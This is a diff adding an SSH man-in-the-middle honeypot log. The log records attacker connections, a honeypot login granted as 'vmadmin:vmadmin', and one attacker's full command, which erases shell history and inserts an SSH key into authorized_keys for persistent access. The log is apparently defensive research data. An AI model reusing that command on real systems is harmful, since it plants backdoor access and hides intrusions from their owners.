@@ -1,0 +1,18 @@
+2019-11-12 23:34:40.775 - [Info] MITM Version: 1.26
+2019-11-12 23:34:40.783 - [Info] Auto Access Enabled: true
+2019-11-12 23:34:40.783 - [Debug] [Init] Auto Access Barrier: true
+2019-11-12 23:34:40.811 - [Info] SSH man-in-the-middle server for 172.20.0.2 listening on 0.0.0.0:10101
+2019-11-12 23:36:41.889 - [Debug] [Connection] Attacker connected: 187.39.201.19 | Client Identification: SSH-2.0-libssh_0.8.2
+2019-11-12 23:36:49.204 - [Debug] [Connection] Attacker closed the connection
+2019-11-12 23:39:09.373 - [Debug] [Connection] Attacker connected: 46.101.163.220 | Client Identification: SSH-2.0-libssh2_1.2.8
+2019-11-12 23:39:10.374 - [Debug] [Auth] Attacker 46.101.163.220 trying to authenticate with "password"
+2019-11-12 23:39:10.375 - [Debug] [Auto Access] Attacker: 46.101.163.220, Threshold: 1, Attempts: 1
+2019-11-12 23:39:10.375 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-12 23:39:10.375 - [Debug] [Auto Access] Adding the following credentials: "vmadmin:vmadmin"
+2019-11-12 23:39:10.591 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-12 23:39:10.591 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.2
+2019-11-12 23:39:10.636 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-12 23:39:11.099 - [Debug] [EXEC] Noninteractive mode attacker command: uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd;mkdir .ssh;cat .ssh/authorized_keys|grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k;mv .ssh/.auth_k .ssh/authorized_keys;cd
+2019-11-12 23:39:11.838 - [Debug] [Connection] Attacker closed connection
+2019-11-12 23:39:11.870 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-11-12 23:39:11.870 - [Debug] [LXC] Container's OpenSSH server closed connection
